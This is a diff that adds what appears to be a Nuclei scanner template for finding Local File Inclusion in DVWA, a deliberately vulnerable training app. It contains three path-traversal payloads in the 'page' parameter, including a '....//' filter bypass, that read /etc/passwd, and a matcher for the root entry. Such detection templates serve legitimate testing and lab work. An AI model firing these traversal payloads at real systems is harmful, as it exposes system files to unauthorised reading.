@@ -1,0 +1,28 @@
+id: dvwa-file-inclusion
+
+info:
+  name: DVWA - File Inclusion (Low Security)
+  author: vulnremediate
+  severity: high
+  description: Local File Inclusion in DVWA File Inclusion module
+  tags: lfi,dvwa,php,file-inclusion
+  reference:
+    - https://github.com/digininja/DVWA
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/fi/?page=../../../../../../etc/passwd"
+      - "{{BaseURL}}/vulnerabilities/fi/?page=/etc/passwd"
+      - "{{BaseURL}}/vulnerabilities/fi/?page=....//....//....//etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
+
+      - type: status
+        status:
+          - 200
